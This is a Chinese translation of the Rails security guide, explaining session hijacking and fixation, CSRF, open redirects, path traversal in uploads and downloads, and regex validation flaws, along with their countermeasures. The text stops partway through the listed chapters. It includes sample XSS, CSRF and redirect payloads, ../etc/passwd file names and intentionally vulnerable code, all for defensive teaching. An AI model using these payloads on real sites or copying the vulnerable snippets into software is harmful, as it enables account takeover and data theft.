文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  Rails 安全指南

本文介绍网页程序中常见的安全隐患，以及如何在 Rails 中防范。

读完本文，你将学到：

    所有推荐使用的安全对策；
    Rails 中会话的概念，应该在会话中保存什么内容，以及常见的攻击方式；
    单单访问网站为什么也有安全隐患（跨站请求伪造）；
    处理文件以及提供管理界面时应该注意哪些问题；
    如果管理用户：登录、退出，以及各种攻击方式；
    最常见的注入攻击方式；

Chapters

    简介
    会话
        会话是什么
        会话 ID
        会话劫持
        会话安全指南
        会话存储
        CookieStore 存储会话的重放攻击
        会话固定攻击
        会话固定攻击的对策
        会话过期
    跨站请求伪造
        CSRF 的对策
    重定向和文件
        重定向
        文件上传
        上传文件中的可执行代码
        文件下载
    局域网和管理界面的安全
        其他预防措施
    用户管理
        暴力破解账户
        盗取账户
        验证码
        日志
        好密码
        正则表达式
        权限提升
    注入
        白名单与黑名单
        SQL 注入
        跨站脚本
        CSS 注入
        Textile 注入
        Ajax 注入
        命令行注入
        报头注入
    生成的不安全查询
    默认报头
    环境相关的安全问题
    其他资源

##  1 简介

网页程序框架的作用是帮助开发者构建网页程序。有些框架还能增强网页程序的安全性。其实框架之间无所谓谁更安全，只要使用得当，就能开发出安全的程序。Rails 提供了很多智能的帮助方法，例如避免 SQL 注入的方法，可以避免常见的安全隐患。我很欣慰，我所审查的 Rails 程序安全性都很高。

一般来说，安全措施不能随取随用。安全性取决于开发者怎么使用框架，有时也跟开发方式有关。而且，安全性受程序架构的影响：存储方式，服务器，以及框架本身等。

不过，根据加特纳咨询公司的研究，约有 75% 的攻击发生在网页程序层，“在 300 个审查的网站中，97% 有被攻击的可能”。网页程序相对而言更容易攻击，因为其工作方式易于理解，即使是外行人也能发起攻击。

网页程序面对的威胁包括：窃取账户，绕开访问限制，读取或修改敏感数据，显示欺诈内容。攻击者有可能还会安装木马程序或者来路不明的邮件发送程序，用于获取经济利益，或者修改公司资源，破坏企业形象。为了避免受到攻击，最大程度的降低被攻击后的影响，首先要完全理解各种攻击方式，这样才能有的放矢，找到最佳对策——这就是本文的目的。

为了能开发出安全的网页程序，你必须要了解所用组件的最新安全隐患，做到知己知彼。想了解最新的安全隐患，可以订阅安全相关的邮件列表，阅读关注安全的博客，养成更新和安全检查的习惯。详情参阅“其他资源”一节。我自己也会动手检查，这样才能找到可能引起安全问题的代码。
##  2 会话

会话是比较好的切入点，有一些特定的攻击方式。
###  2.1 会话是什么

HTTP 是无状态协议，会话让其变成有状态。

大多数程序都要记录用户的特定状态，例如购物车里的商品，或者当前登录用户的 ID。没有会话，每次请求都要识别甚至重新认证用户。Rails 会为访问网站的每个用户创建会话，如果同一个用户再次访问网站，Rails 会加载现有的会话。

会话一般会存储一个 Hash，以及会话 ID。ID 是由 32 个字符组成的字符串，用于识别 Hash。发送给浏览器的每个 cookie 中都包含会话 ID，而且浏览器发送到服务器的每个请求中也都包含会话 ID。在 Rails 程序中，可以使用 session 方法保存和读取会话：
session[:user_id] = @current_user.id
User.find(session[:user_id])
###  2.2 会话 ID

会话 ID 是 32 位字节长的 MD5 哈希值。

会话 ID 是一个随机生成的哈希值。这个随机生成的字符串中包含当前时间，0 和 1 之间的随机数字，Ruby 解释器的进程 ID（随机生成的数字），以及一个常量。目前，还无法暴力破解 Rails 的会话 ID。虽然 MD5 很难破解，但却有可能发生同值碰撞。理论上有可能创建完全一样的哈希值。不过，这没什么安全隐患。
###  2.3 会话劫持

窃取用户的会话 ID 后，攻击者就能以该用户的身份使用网页程序。

很多网页程序都有身份认证系统，用户提供用户名和密码，网页程序验证提供的信息，然后把用户的 ID 存储到会话 Hash 中。此后，这个会话都是有效的。每次请求时，程序都会从会话中读取用户 ID，加载对应的用户，避免重新认证用户身份。cookie 中的会话 ID 用于识别会话。

因此，cookie 是网页程序身份认证系统的中转站。得到 cookie，就能以该用户的身份访问网站，这会导致严重的后果。下面介绍几种劫持会话的方法以及对策。

    在不加密的网络中嗅听 cookie。无线局域网就是一种不安全的网络。在不加密的无线局域网中，监听网内客户端发起的请求极其容易。这是不建议在咖啡店工作的原因之一。对网页程序开发者来说，可以使用 SSL 建立安全连接避免嗅听。在 Rails 3.1 及以上版本中，可以在程序的设置文件中设置强制使用 SSL 连接：
    config.force_ssl = true

    大多数用户在公用终端中完工后不清除 cookie。如果前一个用户没有退出网页程序，你就能以该用户的身份继续访问网站。网页程序中一定要提供“退出”按钮，而且要放在特别显眼的位置。

    很多跨站脚本（cross-site scripting，简称 XSS）的目的就是窃取用户的 cookie。详情参阅“跨站脚本”一节。

    有时攻击者不会窃取用户的 cookie，而为用户指定一个会话 ID。这叫做“会话固定攻击”，后文会详细介绍。

大多数攻击者的动机是获利。赛门铁克全球互联网安全威胁报告指出，在地下市场，窃取银行账户的价格为 10-1000 美元（视账户余额而定），窃取信用卡卡号的价格为 0.40-20 美元，窃取在线拍卖网站账户的价格为 1-8 美元，窃取 Email 账户密码的价格为 4-30 美元。
###  2.4 会话安全指南

下面是一些常规的会话安全指南。

    不在会话中存储大型对象。大型对象要存储在数据库中，会话中只保存对象的 ID。这么做可以避免同步问题，也不会用完会话存储空间（空间大小取决于所使用的存储方式，详情见后文）。如果在会话中存储大型对象，修改对象结构后，旧版数据仍在用户的 cookie 中。在服务器端存储会话可以轻而易举地清除旧会话数据，但在客户端中存储会话就无能为力了。

    敏感数据不能存储在会话中。如果用户清除 cookie，或者关闭浏览器，数据就没了。在客户端中存储会话数据，用户还能读取敏感数据。

###  2.5 会话存储

Rails 提供了多种存储会话的方式，其中最重要的一个是 ActionDispatch::Session::CookieStore。

Rails 2 引入了一个新的默认会话存储方式，CookieStore。CookieStore 直接把会话存储在客户端的 cookie 中。服务器无需会话 ID，可以直接从 cookie 中获取会话。这种存储方式能显著提升程序的速度，但却存在争议，因为有潜在的安全隐患：

    cookie 中存储的内容长度不能超过 4KB。这个限制没什么影响，因为前面说过，会话中不应该存储大型数据。在会话中存储用户对象在数据库中的 ID 一般来说也是可接受的。

    客户端能看到会话中的所有数据，因为其中的内容都是明文（使用 Base64 编码，因此没有加密）。因此，不能存储敏感信息。为了避免篡改会话，Rails 会根据服务器端的密令生成摘要，添加到 cookie 的末尾。

因此，cookie 的安全性取决于这个密令（以及计算摘要的算法，为了兼容，默认使用 SHA1）。密令不能随意取值，例如从字典中找个单词，长度也不能少于 30 个字符。

secrets.secret_key_base 指定一个密令，程序的会话用其和已知的安全密令比对，避免会话被篡改。secrets.secret_key_base 是个随机字符串，保存在文件 config/secrets.yml 中：
development:
  secret_key_base: a75d...
 
test:
  secret_key_base: 492f...
 
production:
  secret_key_base: <%= ENV["SECRET_KEY_BASE"] %>

Rails 以前版本中的 CookieStore 使用 secret_token，新版中的 EncryptedCookieStore 使用 secret_key_base。详细说明参见升级指南。

如果你的程序密令暴露了（例如，程序的源码公开了），强烈建议你更换密令。
###  2.6 CookieStore 存储会话的重放攻击

使用 CookieStore 存储会话时要注意一种叫做“重放攻击”（replay attack）的攻击方式。

重放攻击的工作方式如下：

    用户收到一些点数，数量存储在会话中（不应该存储在会话中，这里只做演示之用）；
    用户购买了商品；
    剩余点数还在会话中；
    用户心生歹念，复制了第一步中的 cookie，替换掉浏览器中现有的 cookie；
    用户的点数又变成了消费前的数量；

在会话中写入一个随机值（nonce）可以避免重放攻击。这个随机值只能通过一次验证，服务器记录了所有合法的随机值。如果程序用到了多个服务器情况就变复杂了。把随机值存储在数据库中就违背了使用 CookieStore 的初衷（不访问数据库）。

避免重放攻击最有力的方式是，不在会话中存储这类数据，将其存到数据库中。针对上例，可以把点数存储在数据库中，把登入用户的 ID 存储在会话中。
###  2.7 会话固定攻击

攻击者可以不窃取用户的会话 ID，使用一个已知的会话 ID。这叫做“会话固定攻击”（session fixation）

会话固定攻击

会话固定攻击的关键是强制用户的浏览器使用攻击者已知的会话 ID。因此攻击者无需窃取会话 ID。攻击过程如下：

    攻击者创建一个合法的会话 ID：打开网页程序的登录页面，从响应的 cookie 中获取会话 ID（如上图中的第 1 和第 2 步）。
    程序有可能在维护会话，每隔一段时间，例如 20 分钟，就让会话过期，减少被攻击的可能性。因此，攻击者要不断访问网页程序，让会话保持可用。
    攻击者强制用户的浏览器使用这个会话 ID（如上图中的第 3 步）。由于不能修改另一个域名中的 cookie（基于同源原则），攻击者就要想办法在目标网站的域中运行 JavaScript，通过跨站脚本把 JavaScript 注入目标网站。一个跨站脚本示例：<script>document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";</script>。跨站脚本及其注入方式参见后文。
    攻击者诱引用户访问被 JavaScript 代码污染的网页。查看这个页面后，用户浏览器中的会话 ID 就被篡改成攻击者伪造的会话 ID。
    因为伪造的会话 ID 还没用过，所以网页程序要认证用户的身份。
    此后，用户和攻击者就可以共用同一个会话访问这个网站了。攻击者伪造的会话 ID 漂白了，而用户浑然不知。

###  2.8 会话固定攻击的对策

只需一行代码就能避免会话固定攻击。

最有效的对策是，登录成功后重新设定一个新的会话 ID，原来的会话 ID 作废。这样，攻击者就无法使用固定的会话 ID 了。这个对策也能有效避免会话劫持。在 Rails 中重设会话的方式如下：
reset_session

如果用了流行的 RestfulAuthentication 插件管理用户，要在 SessionsController#create 动作中调用 reset_session 方法。注意，这个方法会清除会话中的所有数据，你要把用户转到新的会话中。

另外一种对策是把用户相关的属性存储在会话中，每次请求都做验证，如果属性不匹配就禁止访问。用户相关的属性可以是 IP 地址或用户代理名（浏览器名），不过用户代理名和用户不太相关。存储 IP 地址时要注意，有些网络服务提供商或者大型组织把用户的真实 IP 隐藏在代理后面，对会话有比较大的影响，所以这些用户可能无法使用程序，或者使用受限。
###  2.9 会话过期

永不过期的会话增加了跨站请求伪造、会话劫持和会话固定攻击的可能性。

cookie 的过期时间可以通过会话 ID 设定。然而，客户端可以修改存储在浏览器中的 cookie，因此在服务器上把会话设为过期更安全。下面的例子把存储在数据库中的会话设为过期。Session.sweep("20 minutes") 把二十分钟前的会话设为过期。
class Session < ActiveRecord::Base
  def self.sweep(time = 1.hour)
    if time.is_a?(String)
      time = time.split.inject { |count, unit| count.to_i.send(unit) }
    end
 
    delete_all "updated_at < '#{time.ago.to_s(:db)}'"
  end
end

在“会话固定攻击”一节提到过维护会话的问题。虽然上述代码能把会话设为过期，但攻击者每隔五分钟访问一次网站就能让会话始终有效。对此，一个简单的解决办法是在会话数据表中添加 created_at 字段，删除很久以前创建的会话。在上面的代码中加入下面的代码即可：
delete_all "updated_at < '#{time.ago.to_s(:db)}' OR
  created_at < '#{2.days.ago.to_s(:db)}'"
##  3 跨站请求伪造

跨站请求伪造（cross-site request forgery，简称 CSRF）攻击的方法是在页面中包含恶意代码或者链接，攻击者认为被攻击的用户有权访问另一个网站。如果用户在那个网站的会话没有过期，攻击者就能执行未经授权的操作。

跨站请求伪造

读过前一节我们知道，大多数 Rails 程序都使用 cookie 存储会话，可能只把会话 ID 存储在 cookie 中，而把会话内容存储在服务器上，或者把整个会话都存储在客户端。不管怎样，只要能找到针对某个域名的 cookie，请求时就会连同该域中的 cookie 一起发送。这就是问题所在，如果请求由域名不同的其他网站发起，也会一起发送 cookie。我们来看个例子。

    Bob 访问一个留言板，其中有篇由黑客发布的帖子，包含一个精心制造的 HTML 图片元素。这个元素指向 Bob 的项目管理程序中的某个操作，而不是真正的图片文件。
    图片元素的代码为 <img src="http://www.webapp.com/project/1/destroy">。
    Bob 在 www.webapp.com 网站上的会话还有效，因为他并没有退出。
    查看这篇帖子后，浏览器发现有个图片标签，尝试从 www.webapp.com 加载这个可疑的图片。如前所述，浏览器会同时发送 cookie，其中就包含可用的会话 ID。
    www.webapp.com 验证了会话中的用户信息，销毁 ID 为 1 的项目。请求得到的响应页面浏览器无法解析，因此不会显示图片。
    Bob 并未察觉到被攻击了，一段时间后才发现 ID 为 1 的项目不见了。

有一点要特别注意，精心制作的图片或链接无需出现在网页程序的同一域名中，任何地方都可以，论坛、博客，甚至是电子邮件。

CSRF 很少出现在 CVE（通用漏洞披露，Common Vulnerabilities and Exposures）中，2006 年比例还不到 0.1%，但却是个隐形杀手。这倒和我（以及其他人）的安全合约工作得到的结果完全相反——CSRF 是个严重的安全问题。
###  3.1 CSRF 的对策

首先，遵守 W3C 的要求，适时地使用 GET 和 POST 请求。其次，在非 GET 请求中加入安全权标可以避免程序受到 CSRF 攻击。

HTTP 协议提供了两种主要的基本请求类型，GET 和 POST（当然还有其他请求类型，但大多数浏览器都不支持）。万维网联盟（World Wide Web Consortium，简称 W3C）提供了一个检查表用于选择 GET 和 POST：

使用 GET 请求的情形：

    交互更像是在询问，例如查询，读取等安全的操作；

使用 POST 请求的情形：

    交互更像是执行某项命令；
    交互改变了资源的状态，且用户能察觉到这个变化，例如订阅一项服务；
    交互的结果由用户负责；

如果你的网页程序使用 REST 架构，可能已经用过其他 HTTP 请求，例如 PATCH、PUT 和 DELETE。现今的大多数浏览器都不支持这些请求，只支持 GET 和 POST。Rails 使用隐藏的 _method 字段处理这一难题。

POST 请求也能自动发送。举个例子，下面这个链接虽在浏览器的状态栏中显示的目标地址是 www.harmless.com ，但其实却动态地创建了一个表单，发起 POST 请求。
<a href="http://www.harmless.com/" onclick="
  var f = document.createElement('form');
  f.style.display = 'none';
  this.parentNode.appendChild(f);
  f.method = 'POST';
  f.action = 'http://www.example.com/account/destroy';
  f.submit();
  return false;">To the harmless survey</a>

攻击者还可以把代码放在图片的 onmouseover 事件句柄中：
<img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." />

伪造请求还有其他方式，例如使用 <script> 标签向返回 JSONP 或 JavaScript 的地址发起跨站请求。响应是可执行的代码，攻击者能找到方法执行其中的代码，获取敏感数据。为了避免这种数据泄露，可以禁止使用跨站 <script> 标签，只允许使用 Ajax 请求获取 JavaScript 响应，因为 XmlHttpRequest 遵守同源原则，只有自己的网站才能发起请求。

为了防止其他伪造请求，我们可以使用安全权标，这个权标只有自己的网站知道，其他网站不知道。我们要在请求中加入这个权标，且要在服务器上做验证。这些操作只需在控制器中加入下面这行代码就能完成：
protect_from_forgery

加入这行代码后，Rails 生成的所有表单和 Ajax 请求中都会包含安全权标。如果安全权标和预期的值不一样，程序会重置会话。

一般来说最好使用持久性 cookie 存储用户的信息，例如 cookies.permanent。此时，cookie 不会被清除，而且自动加入的 CSRF 保护措施也不会受到影响。如果此类信息没有使用会话存储在 cookie 中，就要自己动手处理：
def handle_unverified_request
  super
  sign_out_user # Example method that will destroy the user cookies.
end

上述代码可以放到 ApplicationController 中，如果非 GET 请求中没有 CSRF 权标就会调用这个方法。

注意，跨站脚本攻击会跳过所有 CSRF 保护措施。攻击者通过跨站脚本可以访问页面中的所有元素，因此能读取表单中的 CSRF 安全权标或者直接提交表单。详情参阅“跨站脚本”一节。
##  4 重定向和文件

有一种安全漏洞由网页程序中的重定向和文件引起。
###  4.1 重定向

网页程序中的重定向是个被低估的破坏工具：攻击者可以把用户引到有陷阱的网站，或者制造独立攻击（self-contained attack）。

只要允许用户指定重定向地址，就有可能被攻击。最常见的攻击方式是把用户重定向到一个和正牌网站看起来一模一样虚假网站。这叫做“钓鱼攻击”。攻击者把不会被怀疑的链接通过邮件发给用户，在链接中注入跨站脚本，或者把链接放在其他网站中。用户之所以不怀疑，是因为链接以熟知的网站域名开头，转向恶意网站的地址隐藏在重定向参数中，例如 http://www.example.com/site/redirect?to= www.attacker.com。我们来看下面这个 legacy 动作：
def legacy
  redirect_to(params.update(action:'main'))
end

如果用户访问 legacy 动作，会转向 main 动作。其作用是保护 URL 参数，将其转向 main 动作。但是，如果攻击者在 URL 中指定 host 参数仍能用来攻击：
http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com

如果 host 参数出现在地址的末尾，用户很难察觉，最终被重定向到 attacker.com。对此，一种简单的对策是只允许在 legacy 动作中使用指定的参数（使用白名单，而不是删除不该使用的参数）。如果重定向到一个地址，要通过白名单或正则表达式检查目标地址。
####  4.1.1 独立跨站脚本攻击

还有一种重定向和独立跨站脚本攻击可通过在 Firefox 和 Opera 中使用 data 协议实现。data 协议直接把内容显示在浏览器中，可以包含任何 HTML 或 JavaScript，以及完整的图片：
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K

这是个使用 Base64 编码的 JavaScript 代码，显示一个简单的弹出窗口。在重定向地址中，攻击者可以通过这段恶意代码把用户引向这个地址。对此，一个对策是禁止用户指定重定向的地址。
###  4.2 文件上传

确保上传的文件不会覆盖重要的文件，而且要异步处理文件上传过程。

很多网页程序都允许用户上传文件。程序应该过滤文件名，因为用户可以（部分）指定文件名，攻击者可以使用恶意的文件名覆盖服务器上的任意文件。如果上传的文件存储在 /var/www/uploads 文件夹中，用户可以把上传的文件命名为 ../../../etc/passwd，这样就覆盖了重要文件。当然了，Ruby 解释器需要特定的授权才能这么做。这也是为什么要使用权限更少的用户运行网页服务器、数据库服务器等程序的原因。

过滤用户上传文件的文件名时，不要只删除恶意部分。设想这样一种情况，网页程序删除了文件名中的所有 ../，但是攻击者可以使用 ....//，得到的结果还是 ../。最好使用白名单，确保文件名中只包含指定的字符。这和黑名单的做法不同，黑名单只是简单的把不允许使用的字符删掉。如果文件名不合法，拒绝使用即可（或者替换成允许使用的字符），不要删除不可用的字符。下面这个文件名清理方法摘自 attachment_fu 插件。
def sanitize_filename(filename)
  filename.strip.tap do |name|
    # NOTE: File.basename doesn't work right with Windows paths on Unix
    # get only the filename, not the whole path
    name.sub! /\A.*(\\|\/)/, ''
    # Finally, replace all non alphanumeric, underscore
    # or periods with underscore
    name.gsub! /[^\w\.\-]/, '_'
  end
end

同步处理文件上传一个明显的缺点是，容易受到“拒绝服务”（denial-of-service，简称 DOS）攻击。攻击者可以同时在多台电脑上上传图片，增加服务器负载，最终有可能导致服务器宕机。

所以最好异步处理媒体文件的上传过程：保存媒体文件，然后在数据库中排期一个处理请求，让另一个进程在后台上传文件。
###  4.3 上传文件中的可执行代码

如果把上传的文件存放在特定的文件夹中，其中的源码会被执行。如果 /public 文件夹是 Apache 的根目录，就不能把上传的文件保存在这个文件夹里。

使用广泛的 Apache 服务器有个选项叫做 DocumentRoot。这个选项指定网站的根目录，这个文件夹中的所有文件都会由服务器伺服。如果文件使用特定的扩展名（例如 PHP 和 CGI 文件），请求该文件时会执行其中包含的代码（可能还要设置其他选项）。假设攻击者上传了一个名为 file.cgi 的文件，用户下载这个文件时就会执行其中的代码。

如果 Apache 的 DocumentRoot 指向 Rails 的 /public 文件夹，请不要把上传的文件放在这个文件夹中， 至少要放在子文件夹中。
###  4.4 文件下载

确保用户不能随意下载文件。

就像过滤上传文件的文件名一样，下载文件时也要这么做。send_file() 方法可以把服务器上的文件发送到客户端，如果不过滤用户提供的文件名，可以下载任何一个文件：
send_file('/var/www/uploads/' + params[:filename])

把文件名设为 ../../../etc/passwd 就能下载服务器的登录信息。一个简单的对策是，检查请求的文件是否在指定的文件夹中：
basename = File.expand_path(File.join(File.dirname(__FILE__), '../../files'))
filename = File.expand_path(File.join(basename, @file.public_filename))
raise if basename !=
     File.expand_path(File.join(File.dirname(filename), '../../../'))
send_file filename, disposition: 'inline'

另外一种方法是把文件名保存在数据库中，然后用数据库中的 ID 命名存储在硬盘上的文件。这样也能有效避免执行上传文件中的代码。attachment_fu 插件使用的就是类似方式。
##  5 局域网和管理界面的安全

局域网和管理界面是常见的攻击目标，因为这些地方有访问特权。局域网和管理界面需要多种安全防护措施，但实际情况却不理想。

2007 年出现了第一个专门用于窃取局域网信息的木马，名为“Monster for employers”，攻击 Monster.com 这个在线招聘网站。迄今为止，特制的木马虽然很少出现，但却表明了客户端安全的重要性。不过，局域网和管理界面面对的最大威胁是 XSS 和 CSRF。

XSS 如果转发了来自外部网络的恶意内容，程序有可能受到 XSS 攻击。用户名、评论、垃圾信息过滤程序、订单地址等都是经常被 XSS 攻击的对象。

如果局域网或管理界面的输入没有过滤，整个程序都处在危险之中。可能的攻击包括：窃取有权限的管理员 cookie，注入 iframe 偷取管理员的密码，通过浏览器漏洞安装恶意软件控制管理员的电脑。

XSS 的对策参阅“注入”一节。在局域网和管理界面中也推荐使用 SafeErb 插件。

CSRF 跨站请求伪造（Cross-Site Request Forgery，简称 CSRF 或者 XSRF）是一种防不胜防的攻击方式，攻击者可以用其做管理员和局域网内用户能做的一切操作。CSRF 的工作方式前文已经介绍过，下面我们来看一下攻击者能在局域网或管理界面中做些什么。

一个真实地案例是通过 CSRF 重新设置路由器。攻击者向墨西哥用户发送了一封包含 CSRF 的恶意电子邮件，声称有一封电子贺卡。邮件中还有一个图片标签，发起 HTTP GET 请求，重新设置用户的路由器。这个请求修改了 DNS 设置，如果用户访问墨西哥的银行网站，会被带到攻击者的网站。只要通过这个路由器访问银行网站，用户就会被引向攻击者的网站，导致密码被偷。

还有一个案例是修改 Google Adsense 账户的 Email 地址和密码。如果用户登录 Google Adsense，攻击者就能窃取密码。

另一种常见的攻击方式是在网站中发布垃圾信息，通过博客或论坛传播恶意的跨站脚本。当然了，攻击者要知道地址的结构，不过大多数 Rails 程序的地址结构一目了然。如果程序是开源的，也很容易找出地址的结构。攻击者甚至可以通过恶意的图片标签猜测，尝试各种可能的组合，幸运的话不会超过一千次。

在局域网和管理界面防范 CSRF 的方法参见“CSRF 的对策”一节。
###  5.1 其他预防措施

管理界面一般都位于 www.example.com/admin，或许只有 User 模型的 admin 字段为 true 时才能访问。管理界面显示了用户的输入内容，管理员可根据需求删除、添加和编辑数据。我对管理界面的一些想法：

    一定要考虑最坏的情况：如果有人得到了我的 cookie 或密码该怎么办。你可以为管理界面引入用户角色，限制攻击者的权限。也可为管理界面使用特殊的密码，和网站前台不一样。也许每个重要的动作都使用单独的特殊密码也是个不错的主意。

    管理界面有必要能从世界各地访问吗？考虑一下限制能登陆的 IP 地址段。使用 request.remote_ip 可以获取用户的 IP 地址。这一招虽不能保证万无一失，但却是道有力屏障。使用时要注意代理的存在。

    把管理界面放到单独的子域名中，例如 admin.application.com，使用独立的程序及用户管理系统。这样就不可能从 www.application.com 中窃取管理密码了，因为浏览器中有同源原则：注入 www.application.com 中的跨站脚本无法读取 admin.application.com 中的 cookie，反之亦然。

##  6 用户管理

几乎每个网页程序都要处理权限和认证。不要自己实现这些功能，推荐使用常用的插件，而且要及时更新。除此之外还有一些预防措施，可以让程序更安全。

Rails 身份认证插件很多，比较好的有 devise 和 authlogic。这些插件只存储加密后的密码，不会存储明文。从 Rails 3.1 起，可以使用内建的 has_secure_password 方法实现类似的功能。

注册后程序会生成一个激活码，用户会收到一封包含激活链接的邮件。激活账户后，数据库中的 activation_code 字段被设为 NULL。如果有人访问类似的地址，就能以在数据库中查到的第一个激活的用户身份登录程序，这个用户极有可能是管理员：
http://localhost:3006/user/activate
http://localhost:3006/user/activate?id=

这么做之所以可行，是因为在某些服务器上，访问上述地址后，ID 参数（params[:id]）的值是 nil。查找激活码的方法如下：
User.find_by_activation_code(params[:id])

如果 ID 为 nil，生成的 SQL 查询如下：
SELECT * FROM users WHERE (users.activation_code IS NULL) LIMIT 1

查询到的是数据库中的第一个用户，返回给动作并登入该用户。详细说明参见我博客上的文章。因此建议经常更新插件。而且，审查程序的代码也可以发现类似问题。
###  6.1 暴力破解账户

暴力破解需要不断尝试，根据错误提示做改进。提供模糊的错误消息、使用验证码可以避免暴力破解。

网页程序中显示的用户列表可被用来暴力破解用户的密码，因为大多数用户使用的密码都不复杂。大多数密码都是由字典单词和数字组成的。只要有一组用户名和字典，自动化程序就能在数分钟内找到正确的密码。

因此，大多数网页程序都会显示更模糊的错误消息，例如“用户名或密码错误”。如果提示“未找到您输入的用户名”，攻击者会自动生成用户名列表。

不过，被大多数开发者忽略的是忘记密码页面。这个页面经常会提示能否找到输入的用户名或邮件地址。攻击者据此可以生成用户名列表，用于暴力破解账户。

为了尽量避免这种攻击，忘记密码页面上显示的错误消息也要模糊一点。如果同一 IP 地址多次登录失败后，还可以要求输入验证码。注意，这种方法不能完全禁止自动化程序，因为自动化程序能频繁更换 IP 地址。不过也算增加了一道防线。
###  6.2 盗取账户

很多程序的账户很容易盗取，为什么不增加盗窃的难度呢？
####  6.2.1 密码

攻击者一旦窃取了用户的会话 cookie 就能进入程序。如果能轻易修改密码，几次点击之后攻击者就能盗用账户。如果修改密码的表单有 CSRF 漏洞，攻击者可以把用户引诱到一个精心制作的网页，其中包含可发起跨站请求伪造的图片。针对这种攻击的对策是，在修改密码的表单中加入 CSRF 防护，而且修改密码前要输入原密码。
####  6.2.2 E-Mail

攻击者还可通过修改 Email 地址盗取账户。修改 Email 地址后，攻击者到忘记密码页面输入邮箱地址，新密码就会发送到攻击者提供的邮箱中。针对这种攻击的对策是，修改 Email 地址时要输入密码。
####  6.2.3 其他

不同的程序盗取账户的方式也不同。大多数情况下都要利用 CSRF 和 XSS。例如 Google Mail 中的 CSRF 漏洞。在这个概念性的攻击中，用户被引向攻击者控制的网站。网站中包含一个精心制作的图片，发起 HTTP GET 请求，修改 Google Mail 的过滤器设置。如果用户登入 Google Mail，攻击者就能修改过滤器，把所有邮件都转发到自己的邮箱中。这几乎和账户被盗的危险性相同。针对这种攻击的对策是，审查程序的逻辑，封堵所有 XSS 和 CSRF 漏洞。
###  6.3 验证码

验证码是质询-响应测试，用于判断响应是否由计算机生成。经常用在评论表单中，要求用户输入图片中扭曲的文字，禁止垃圾评论机器人发布评论。验证的目的不是为了证明用户是人类，而是为了证明机器人是机器人。

我们要防护的不仅是垃圾评论机器人，还有自动登录机器人。使用广泛的 reCAPTCHA 会显示两个扭曲的图片，其中的文字摘自古籍，图片中还会显示一条直角线。早期的验证码使用扭曲的背景和高度变形的文字，但这种方式已经被破解了。reCAPTCHA 的这种做法还有个附加好处，可以数字化古籍。ReCAPTCHA 是个 Rails 插件，和所用 API 同名。

你会从 reCAPTCHA 获取两个密钥，一个公匙，一个私匙，这两个密钥要放到 Rails 程序的设置中。然后就可以在视图中使用 recaptcha_tags 方法，在控制器中使用 verify_recaptcha 方法。如果验证失败，verify_recaptcha 方法返回 false。验证码的问题是很烦人。而且，有些视觉受损的用户发现某些扭曲的验证码很难看清。

大多数机器人都很笨拙，会填写爬取页面表单中的每个字段。验证码正式利用这一点，在表单中加入一个诱引字段，通过 CSS 或 JavaScript 对用户隐藏。

通过 JavaScript 和 CSS 隐藏诱引字段可以使用下面的方法：

    把字段移到页面的可视范围之外；
    把元素的大小设的很小，或者把颜色设的和背景色一样；
    显示这个字段，但告诉用户不要填写；

最简单的方法是使用隐藏的诱引字段。在服务器端要检查这个字段的值：如果包含任何文本，就说明这是个机器人。然后可以忽略这次请求，或者返回真实地结果，但不能把数据存入数据库。这样一来，机器人就以为完成了任务，继续前往下一站。对付讨厌的人也可以用这种方法。

Ned Batchelder 的博客中介绍了更复杂的验证码。

注意，验证码只能防范自动机器人，不能阻止特别制作的机器人。所以，验证码或许不是登录表单的最佳防护措施。
###  6.4 日志

告诉 Rails 不要把密码写入日志。

默认情况下，Rails 会把请求的所有信息写入日志。日志文件是个严重的安全隐患，因为其中可能包含登录密码和信用卡卡号等。考虑程序的安全性时，要想到攻击者获得服务器控制权这一情况。如果把明文密码写入日志，数据库再怎么加密也无济于事。在程序的设置文件中可以通过 config.filter_parameters 过滤指定的请求参数，不写入日志。过滤掉的参数在日志中会使用 [FILTERED] 代替。
config.filter_parameters << :password
###  6.5 好密码

你是否发现很难记住所有密码？不要把密码记下来，使用容易记住的句子中单词的首字母。

安全专家 Bruce Schneier 研究了钓鱼攻击（如下所示）获取的 34000 个真实的 MySpace 用户名和密码，发现大多数密码都很容易破解。最常用的 20 个密码是：

password1, abc123, myspace1, password, blink182, qwerty1, ****you, 123abc, baseball1, football1, 123456, soccer, monkey1, liverpool1, princess1, jordan23, slipknot1, superman1, iloveyou1, monkey

这些密码只有不到 4% 使用了字典中能找到的单词，而且大都由字母和数字组成。破解密码的字典中包含大多数常用的密码，攻击者会尝试所有可能的组合。如果攻击者知道你的用户名，而且密码很弱，你的账户就很容易被破解。

好的密码是一组很长的字符串，混合字母和数字。这种密码很难记住，建议你使用容易记住的长句的首字母。例如，从“The quick brown fox jumps over the lazy dog”中得到的密码是“Tqbfjotld”。注意，我只是举个例子，请不要使用熟知的名言，因为破解字典中可能有这些名言。
###  6.6 正则表达式

使用 Ruby 正则表达式时经常犯的错误是使用 ^ 和 $ 分别匹配字符串的开头和结尾，其实应该使用 \A 和 \z。

Ruby 使用了有别于其他编程语言的方式来匹配字符串的开头和结尾。这也是为什么很多 Ruby/Rails 相关的书籍都搞错了。为什么这是个安全隐患呢？如果想不太严格的验证 URL 字段，使用了如下的正则表达式：
/^https?:\/\/[^\n]+$/i

在某些编程语言中可能没问题，但在 Ruby 中，^ 和 $ 分别匹配一行的开头和结尾。因此下面这种 URL 能通过验证：
javascript:exploit_code();/*
http://hi.com
*/

之所以能通过，是因为第二行匹配了正则表达式，其他两行无关紧要。假设在视图中要按照下面的方式显示 URL：
link_to "Homepage", @user.homepage

访问者不会觉得这个链接有问题，点击之后，却执行了 exploit_code 这个 JavaScript 函数，或者攻击者提供的其他 JavaScript 代码。

修正这个正则表达式的方法是，分别用 \A 和 \z 代替 ^ 和 $，如下所示：
/\Ahttps?:\/\/[^\n]+\z/i

